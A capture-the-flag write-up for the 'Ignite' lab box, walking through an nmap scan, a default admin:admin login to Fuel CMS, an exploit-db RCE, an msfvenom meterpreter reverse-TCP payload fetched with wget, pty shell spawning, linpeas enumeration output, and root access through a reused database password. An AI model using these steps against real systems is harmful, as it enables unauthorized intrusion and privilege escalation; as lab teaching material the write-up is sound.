@@ -1,0 +1,225 @@
+Ignite WriteUp
+
+IP = 10.10.217.230
+
+/////  started with nmap command -A -sC -sV -T4 -oN Ignite.txt 10.10.217.230 \\\\\\\\
+# Nmap 7.92 scan initiated Fri May 20 23:19:11 2022 as: nmap -A -sC -sV -T4 -oN Ignite.txt 10.10.217.230
+Nmap scan report for 10.10.217.230
+Host is up (0.16s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+Service Info: Host: 127.0.1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 20 23:20:59 2022 -- 1 IP address (1 host up) scanned in 108.51 seconds
+                              
+On the Main page its a alot of info about eh configuration and paths but as you scroll down the page we find the username and password admin:admin
+
+Checking out the robots.txt we just find the disallow /fuel/
+
+The fuel directory is a login! Lets use the admin:admin and get in!
+
+Boom we're in! Now its time to head over to exploit-db for the exploit info
+
+https://www.exploit-db.com/exploits/50477
+
+This will give us and RCE on the sever 
+Now lets get the user.txt
+Run the command "pwd" to print your working directory so we can work from there
+We can't use the command "cd" so we have to do an "ls -la" of where we want to go be
+in the CMD: prompt you have type: ../../../home/www-data
+
+#Enter Command $ls -la ../../../home/www-data
+#systemtotal 12
+#drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
+#drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
+#-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
+
+Now cat the flag and there is your first flag!
+
+Now time for a better shell!
+
+I use msfvenom to make a meterpreter payload and run that more a more stable shell
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f elf > (whatever_you_want.txt)
+
+Fire up msfconsole and use exploit/multi/handler
+
+Then set your payload to linux/x86/meterpreter/reverse_tcp
+
+Open another terminal and in the place you saved the .elf payload serve it with python or however you choose
+
+python3 -m http.server 8080
+
+Now lets wget the file from where we have our RCE
+Run the reverse shell and now you have a meterpreter session
+Type "shell" 
+then we have to spawn one using python "python -c 'import pty; pty.spawn("/bin/sh")'"
+Now type "bash"
+
+#meterpreter > shell
+#Process 2046 created.
+#Channel 1 created.
+#bash
+#python -c 'import pty; pty.spawn("/bin/sh")'
+#$ bash
+#bash
+#www-data@ubuntu:~/html$ ls
+
+
+Now Lets upload linpeas to the taret!
+
+Host the linpeas script the same way we did the meterpreter payload, with python.
+
+But first lets CD into /tmp just to make sure its all clear to read/write/execute
+
+wget the linpeas script 
+
+Chmod +x linpeas.sh
+
+Then run ./linpeas.sh
+
+www-data@ubuntu:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@ubuntu:/tmp$ ./linpeas.sh
+./linpeas.sh
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------\
+    |                             Do you like PEASS?                            |                                                                                                                  
+    |---------------------------------------------------------------------------|                                                                                                                  
+    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                                                                                                  
+    |         Follow on Twitter   :     @carlospolopm                           |                                                                                                                  
+    |         Respect on HTB      :     SirBroccoli                             |                                                                                                                  
+    |---------------------------------------------------------------------------|                                                                                                                  
+    |                                 Thank you!                                |                                                                                                                  
+    \---------------------------------------------------------------------------/                                                                                                                  
+          linpeas-ng by carlospolop                                                                                                                                                                
+                                                                                                                                                                                                   
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                            
+                                                                                                                                                                                                   
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:                                                                                                                                                                                           
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+                                         ╔═══════════════════╗
+═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                                            
+                                         ╚═══════════════════╝                                                                                                                                     
+OS: Linux version 4.15.0-45-generic (buildd@lcy01-amd64-027) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10)) #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: ubuntu
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                      
+                                                                                                                                                                                                   
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+. 
+
+
+
+. DONE
+                                                                                                                                                                                                   
+                                        ╔════════════════════╗
+════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                                                             
+                                        ╚════════════════════╝                                                                                                                                     
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                 
+Linux version 4.15.0-45-generic (buildd@lcy01-amd64-027) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10)) #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019                         
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04.6 LTS
+Release:        16.04
+Codename:       xenial
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                    
+Sudo version 1.8.16                                                                                                                                                                                
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034                                                                                                                                                                        
+
+./linpeas.sh: 1197: ./linpeas.sh: [[: not found
+./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
+./linpeas.sh: 1197: ./linpeas.sh: 0: not found
+./linpeas.sh: 1207: ./linpeas.sh: [[: not found
+
+╔══════════╣ USBCreator
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                    
+Vulnerable!!                                                                                  
+
+
+## I'm not going to show the whole output but if you wait for this to finish you MIGHT find some info you need! There are other ways to do this but I did it this way ##
+
+╔══════════╣ Analyzing Backup Manager Files (limit 70)
+                                                                                                                                                                                                   
+-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
+|       ['password'] The password used to connect to the database
+|       ['database'] The name of the database you want to connect to
+        'password' => 'm$$$$$',
+        'database' => 'fuel_schema',
+
+
+## Seems we found a password! I wonder if the root user reuses passwords! ##
+
+
+
+#www-data@ubuntu:/tmp$ su root
+#su root
+#Password: mememe
+
+#root@ubuntu:/tmp# ls
+#ls
+#linpeas.sh
+#systemd-private-00d9f55c813346598e3d2cd81c9ee1d6-colord.service-7nOok2
+#systemd-private-00d9f55c813346598e3d2cd81c9ee1d6-rtkit-daemon.service-yZp4zt
+#systemd-private-00d9f55c813346598e3d2cd81c9ee1d6-systemd-timesyncd.service-SpSIHE
+#VMwareDnD
+#root@ubuntu:/tmp# cd /root
+#cd /root
+#root@ubuntu:~# ls
+#ls
+#root.txt
+#root@ubuntu:~# cat root.txt
+#cat root.txt
+#b9bbcb33************** 
+#root@ubuntu:~# ^C
+
+
+
+HAPPY HACKING!!
